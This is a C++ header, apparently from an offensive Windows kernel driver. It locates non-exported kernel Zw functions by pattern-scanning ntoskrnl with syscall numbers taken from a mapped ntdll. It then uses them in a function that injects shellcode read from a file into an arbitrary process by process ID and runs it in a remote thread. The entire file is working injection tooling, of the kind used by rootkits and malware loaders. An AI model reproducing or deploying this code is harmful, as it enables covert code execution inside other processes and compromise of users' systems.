#pragma once

#include "WinTypes.hpp"
#include "FileUtils.hpp"
#include "ProcessUtils.hpp"

//
// Byte pattern used to locate Zw functions in the kernel.
//
UCHAR ZWPATTERN[30] = {
    0x48, 0x8B, 0xC4,                         // mov rax, rsp
    0xFA,                                     // cli
    0x48, 0x83, 0xEC, 0x10,                   // sub rsp, 10h
    0x50,                                     // push rax
    0x9C,                                     // pushfq
    0x6A, 0x10,                               // push 10h
    0x48, 0x8D, 0x05, 0xCC, 0xCC, 0xCC, 0xCC, // lea rax, KiServiceLinkage
    0x50,                                     // push rax
    0xB8, 0xCC, 0xCC, 0xCC, 0xCC,             // mov eax, <SSN>
    0xE9, 0xCC, 0xCC, 0xCC, 0xCC              // jmp KiServiceInternal
};

/**
 * @brief Retrieves the System Service Number (SSN) for a given NTAPI function.
 *
 * @param[in]  Function A pointer to a null-terminated ANSI string containing
 *                      the NTAPI function name (e.g., "NtOpenProcess").
 * @param[out] Ssn      A pointer to a USHORT that will receive the resolved
 *                      system service number (SSN) if the function is found.
 *
 * @return STATUS_SUCCESS if the SSN was successfully retrieved.
 *         An appropriate NTSTATUS error code if the lookup fails.
 */
NTSTATUS
GetSsn(
    _In_  LPCSTR  Function,
    _Out_ PUSHORT Ssn
) {
    PVOID             BaseAddr   = NULL;
    HANDLE            HSection   = NULL;
    ULONGLONG         ViewSize   = NULL;
    NTSTATUS          Status     = STATUS_UNSUCCESSFUL;
    LARGE_INTEGER     Large      = { 0 };
    OBJECT_ATTRIBUTES ObjAttr    = { 0 };
    UNICODE_STRING    KnownNtdll = RTL_CONSTANT_STRING(L"\\KnownDlls\\ntdll.dll");

    InitializeObjectAttributes(&ObjAttr, &KnownNtdll, OBJ_CASE_INSENSITIVE, NULL, NULL);

    //
    // Open the section for ntdll.dll from \KnownDlls
    //
    Status = ZwOpenSection(&HSection, SECTION_MAP_READ | SECTION_QUERY, &ObjAttr);
    if (!NT_SUCCESS(Status)) {
        LOG_MSG("ZwOpenSection Failed With Status 0x%08X\n", Status);
        goto CLEANUP;
    }

    //
    // Map the section into memory for reading
    //
    Status = BeGlobals::pZwMapViewOfSection(HSection, (HANDLE)-1, &BaseAddr, 0, 0, &Large, &ViewSize, ViewUnmap, 0, PAGE_READONLY);
    if (!NT_SUCCESS(Status)) {
        LOG_MSG("ZwMapViewOfSection Failed With Status 0x%08X\n", Status);
        goto CLEANUP;
    }

    //
    // Retrieve NT headers and locate the Export Directory
    //
    ULONG_PTR ModuleBase = (ULONG_PTR)BaseAddr;
    PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)(((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew + ModuleBase);
    if (NtHeader->Signature != IMAGE_NT_SIGNATURE)
        goto CLEANUP;

    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG  Names     = (PULONG)(ModuleBase + ExportDirectory->AddressOfNames);
    PULONG  Functions = (PULONG)(ModuleBase + ExportDirectory->AddressOfFunctions);
    PUSHORT Ordinals  = (PUSHORT)(ModuleBase + ExportDirectory->AddressOfNameOrdinals);

    //
    // Iterate over exported functions
    //
    for (ULONG I = 0; I < ExportDirectory->NumberOfNames; I++) {
        PCHAR Name    = (PCHAR)(ModuleBase + Names[I]);
        PVOID Address = (PVOID)(ModuleBase + Functions[Ordinals[I]]);

        //
        // Compare the name with the requested function
        //
        if (strcmp(Name, Function) == 0) {
            PUCHAR SyscallAddr = (PUCHAR)Address;

            //
            // Validate the expected syscall stub pattern
            //
            if (SyscallAddr[0] == 0x4C && SyscallAddr[1] == 0x8B &&
                SyscallAddr[2] == 0xD1 && SyscallAddr[3] == 0xB8 &&
                SyscallAddr[6] == 0x00 && SyscallAddr[7] == 0x00
               ) 
            {
                *Ssn   = (USHORT)(SyscallAddr[4] | (SyscallAddr[5] << 8));
                Status = STATUS_SUCCESS;
                break;
            }
        }
    }

CLEANUP:
    //
    // Clean up resources
    //
    if (BaseAddr) BeGlobals::pZwUnmapViewOfSection((HANDLE)-1, BaseAddr);
    if (HSection) BeGlobals::pZwClose(HSection);

    return Status;
}

/**
 * @brief Retrieves the address of a non-exported Zw function using the SSN of its Nt counterpart.
 *
 * @param[in] Name Pointer to a null-terminated ANSI string representing the name
 *                 of the NTAPI function (e.g., "NtCreateThreadEx").
 *
 * @return A pointer to the resolved Zw function address if successful.
 *         Returns NULL if the function name is invalid or the resolution fails.
 */
PVOID
FindZwFunction(
    _In_ LPCSTR Name
) {
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    USHORT   Ssn    = NULL;

    //
    // Validate the input parameter
    //
    if (!Name) {
        LOG_MSG("Invalid parameters.\n");
        return NULL;
    }

    //
    // Retrieve the NT headers from the kernel base
    //
    PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)BeGlobals::NtOsKrnlAddr)->e_lfanew + (ULONG_PTR)BeGlobals::NtOsKrnlAddr);
    if (NtHeader->Signature != IMAGE_NT_SIGNATURE) return NULL;

    //
    // Retrieve the syscall number (SSN) of the specified function
    //
    Status = GetSsn(Name, &Ssn);
    if (!NT_SUCCESS(Status)) {
        LOG_MSG("GetSsn Failed With Status 0x%08X\n", Status);
        return NULL;
    }

    //
    // Insert the retrieved syscall number into the pattern
    //
    PUCHAR SsnBytes = (PUCHAR)&Ssn;
    ZWPATTERN[21]   = SsnBytes[0];
    ZWPATTERN[22]   = SsnBytes[1];

    //
    // Iterate over all sections to find the .text section
    //
    PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&NtHeader->OptionalHeader + NtHeader->FileHeader.SizeOfOptionalHeader);
    for (ULONG I = 0; I < NtHeader->FileHeader.NumberOfSections; I++) {
        if ((*(PULONG)SectionHeader[I].Name | 0x20202020) == 'xet.') {

            ULONG_PTR Start    = (ULONG_PTR)BeGlobals::NtOsKrnlAddr + SectionHeader[I].VirtualAddress;
            ULONG_PTR End      = Start + SectionHeader[I].Misc.VirtualSize;
            PUCHAR    Data     = (PUCHAR)Start;
            SIZE_T    DataSize = End - Start;

            //
            // Scan the .text section for the known instruction pattern
            //
            for (SIZE_T Offset = 0; Offset <= DataSize - sizeof(ZWPATTERN); Offset++) {
                BOOLEAN Found = TRUE;

                //
                // Compare each byte of the pattern
                //
                for (SIZE_T J = 0; J < sizeof(ZWPATTERN); J++) {
                    if (ZWPATTERN[J] != 0xCC && Data[Offset + J] != ZWPATTERN[J]) {
                        Found = FALSE;
                        break;
                    }
                }

                //
                // Return the address if the pattern is found
                //
                if (Found) return (PVOID)(Start + Offset);
            }
        }
    }

    return NULL;
}

/**
 * @brief Injects shellcode into a remote process.
 *
 * @param[in] Pid  The process ID of the target process.
 * @param[in] FilePath A pointer to a null-terminated wide string
 *                     containing the path to the shellcode file.
 *
 * @return STATUS_SUCCESS if the injection was successful.
 *         An appropriate NTSTATUS error code if the operation fails.
 */
NTSTATUS
BeInjectionShellcode(
    _In_ ULONG  Pid,
    _In_ PCWSTR FilePath
) {
    HANDLE            HProcess     = NULL;
    PVOID             BaseAddr     = NULL;
    SIZE_T            ResultNumber = NULL;
    ULONG             OldProtect   = NULL;
    HANDLE            HThread      = NULL;
    OBJECT_ATTRIBUTES ObjAttr      = { 0 };
    CLIENT_ID         ClientId     = { 0 };
    PVOID             Shellcode    = NULL;
    SIZE_T            Size         = NULL;

    //
    // Get EPROCESS structure of the target process
    //
    PEPROCESS Prc = BeGetEprocessByPid(Pid);
    if (Prc == NULL)
        return STATUS_INVALID_PARAMETER;

    //
    // Read shellcode from the specified file
    //
    NTSTATUS Status = BeReadFile(FilePath, &Shellcode, &Size);
    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("BeReadFile Failed With Status: 0x%08X\n", Status);
        return Status;
    }

    //
    // Open a handle to the target process
    //
    ClientId.UniqueProcess = ULongToHandle(Pid);
    InitializeObjectAttributes(&ObjAttr, NULL, NULL, NULL, NULL);
    Status = BeGlobals::pZwOpenProcess(&HProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientId);
    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("ZwOpenProcess Failed With Status: 0x%08X\n", Status);
        return Status;
    }

    //
    // Allocate memory in the target process for the shellcode
    //
    Status = BeGlobals::pZwAllocateVirtualMemory(HProcess, &BaseAddr, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("ZwAllocateVirtualMemory Failed With Status: 0x%08X\n", Status);
        goto EXIT;
    }

    //
    // Copy the shellcode into the allocated memory
    //
    Status = BeGlobals::pMmCopyVirtualMemory(
        IoGetCurrentProcess(),
        Shellcode,
        Prc,
        BaseAddr,
        Size,
        KernelMode,
        &ResultNumber
    );

    if (!NT_SUCCESS(Status) || ResultNumber != Size)
    {
        LOG_MSG("MmCopyVirtualMemory Failed: 0x%08X\n", Status);
        goto EXIT;
    }

    //
    // Change memory protection to executable
    //
    Status = BeGlobals::pZwProtectVirtualMemory(HProcess, &BaseAddr, &Size, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(Status)) {
        LOG_MSG("ZwProtectVirtualMemory Failed With Status 0x%08X\n", Status);
        goto EXIT;
    }

    //
    //
    // Create a remote thread to execute the shellcode
    //
    InitializeObjectAttributes(&ObjAttr, NULL, NULL, NULL, NULL);
    Status = BeGlobals::pZwCreateThreadEx(
        &HThread,
        THREAD_ALL_ACCESS,
        &ObjAttr,
        HProcess,
        BaseAddr,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );

    if (!NT_SUCCESS(Status))
        LOG_MSG("ZwCreateThreadEx Failed With Status 0x%08X\n", Status);

EXIT:
    if (HThread)  BeGlobals::pZwClose(HThread);
    if (HProcess) BeGlobals::pZwClose(HProcess);
    if (Prc) ObDereferenceObject(Prc);

    return Status;
}